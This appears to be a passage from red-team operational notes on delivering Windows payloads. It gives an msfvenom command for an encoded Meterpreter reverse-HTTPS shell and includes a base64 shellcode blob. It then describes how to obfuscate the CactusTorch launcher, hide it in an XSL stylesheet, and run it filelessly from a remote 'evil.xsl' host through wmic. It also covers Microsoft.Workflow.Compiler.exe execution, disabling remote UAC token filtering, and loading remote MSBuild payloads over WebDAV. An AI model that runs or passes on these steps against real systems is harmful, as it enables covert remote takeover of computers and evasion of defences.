				   A JavaScript and VBScript shellcode launcher. This will spawn a 32 bit version of the binary specified and inject shellcode into it.
				
				   Usage:
				   Choose a binary you want to inject into, default "rundll32.exe", you can use notepad.exe, calc.exe for example...
				   Generate a 32 bit raw shellcode in whatever framework you want. Tested: Cobalt Strike, Metasploit Framework
				   Run: cat payload.bin | base64 -w 0
				   Copy the base64 encoded payload into the code variable below.

		1. Generate a payload, encode in base64
			* msfvenom

					$ msfvenom -e x86/fnstenv_mov -i 13 -f raw -p windows/meterpreter/reverse_https LHOST=REDACTED_INFRASTRUCTURE LPORT=443 | base64 -w 0
					[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
					[-] No arch selected, selecting arch: x86 from the payload
					Found 1 compatible encoders
					Attempting to encode payload with 13 iterations of x86/fnstenv_mov
					x86/fnstenv_mov succeeded with size 522 (iteration=0)
					...
					x86/fnstenv_mov succeeded with size 811 (iteration=12)
					x86/fnstenv_mov chosen with final size 811
					Payload size: 811 bytes

					Kcmxxdnu2XQk9FuBcxP6k6uhg+v84vTTWhoeI31y1d5n8CCJgMnFTwEoSgZxX/BXl4AacP9N52p9uLCNOruLEaXSP3zSFIhnGvyvD90BtY0oVlIUBG/0VULZoyJAQbrOsmbSF098UOIYm1u5KuyIiJdq/xh4eMjqXxAbF0WS7kCi9tI1ckqEz1M9e0cGq4lgbn50euyLI52vyPmANOGsbEM5W5Yiy3z+zTZmfDhhgYyQJ1OkUu5w0yPyFnPL1X6SNs/8Z2EoUUsEPCQN7tlTO3acL8lR9NQ0S3YhY6x7b3kHrkvsXdnHFmccLzEP4dIrjRSFzLjF9nhVfgo9IspvbvIiSAYF31KE8Ii1hMZ1YlyaB0QrQDFxwsSVXD/eF6loOY64xUnPw+fIuBZjdi/qi5SmD7o0S2HbxKS4h399/gCGB+U8vgnbdFgTi/f2A8pKOyLrTBbduNx/ffoAvhNhx+VXCcP1/rsArQ/rWH9m8mjOZmG/fy48uguDK0T5Li2zFFociInX0fbQWg7Tf3fOiidJYYe/pLKX9fxhj38uOgKwC87Qr06z0aXQCtSrdWGZH6K345pKnoucWIPlnXuCx4MJ7XQhHjHYp3y52JwVvPJT0D/Yp0Xp2KdHEav0LwKW9S/qpKVFrfyWaKbMgxyc8pBwpLmFSp35g0ikvMNoofKlYZrckkfbxaJmvsyeWaDdpmCu4753kM25VozTsnyZspBA3uSHQZ7ZomOMx5ccoKaNW5rig0O6up0W29SYQ7jtxWCL57VlpP+Tecfyu26I2qx3jL+lVYnhk3aru64cpsChG4f5p1u+zZxJkuq/H4jf9H+C3H2wLHQhpizYnC/Ya3B8udijfLzjH3rEsAv6fOH+cIILxy/qAhRF7tueMLzjgWl0DQv6udinfLzj2Sny8Av6b0uBO4ID5y/q47Df32sL+qX+Ocegi/QvgMucL/qL9Efqi7QvueOsi7luC/p52KemDdycL8qL9Hy84+a5Y2kL+m9LgOBhjPXsb0uByrJIq8eBdAvQ277NAdy+2h3YstoX2YtP318pokXq2Av6KBtxlaDmuQpvY6k5oQ==
		1. Copy the base64 output and paste it into the CactusTorch script.
		1. Run the entire CactusTorch script through a Javascript obfuscator
		1. Copy obfuscated code and paste it into the CDATA section of a script-enabled stylesheet:

				<?xml version='1.0'?>
				<stylesheet
				xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
				xmlns:user="placeholder"
				version="1.0">
				<output method="text"/>
					<ms:script implements-prefix="user" language="JScript">
					<![CDATA[

				PASTE OBFUSCATED CACTUSTORCH CODE HERE

					]]> </ms:script>
				</stylesheet>
		1. Host .xsl file on web server with a valid SSL certificate
		1. Run the following command to execute the payload without touching disk:

				wmic os get /format:"https://<INFRASTRUCTURE>evil.xsl"
			* NOTE #1: For some unknown reason, this only works from cmd.exe and not from Powershell
			* NOTE #2: Also, the URL must use a hostname.
* <details><summary>Microsoft.Workflow.Compiler.exe (Click to expand)</summary><p>
	* References
		* [https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb](https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb)
		* [https://www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-veil-and-cobalt-strike/](https://www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-veil-and-cobalt-strike/)
	* Process
		1. Copy the `c.xml` to `c:\users\public\downloads\c.xml` [Payload Link](Testaments_and_Books/Redvelations/)
		1. Copy `c.c` to `c:\users\public\downloads\` (our example runs 64 bit calculator) [t](t)
		1. Execute (cmd)

				C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe c:\users\public\downloads\c.xml c:\users\public\downloads\results.xml

### Shellcode Guide

1. Generate Payload [Windows Payload Generation Guide](Testaments_and_Books/Redvelations/Windows/004-2_Windows_Payload_Generation.md)

### Windows 10 Authentication

* If you're trying to connect to a system that you know you have a local Administrator account for, but still getting errors (e.g., rpc access denied via impacket), then you might be going up against an issue with the Remote UAC.
* In order to allow for connections, typically to a non-domain joined system, you need to enable this registry key to allow remote connections:
	* `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\`
		* `LocalAccountTokenFilterPolicy DWORD`
		* `Value: 1`


### Needs research

* Forty North Security Implementation -<br />[https://fortynorthsecurity.com/blog/remotely-host-msbuild-payloads/](https://fortynorthsecurity.com/blog/remotely-host-msbuild-payloads/)
	* Separate C-Sharp payload from XML

		```c#
		<Code Type="Class" Language="cs" Source="\\204.<>.<>.236\webdav\calc.cs"/>
		```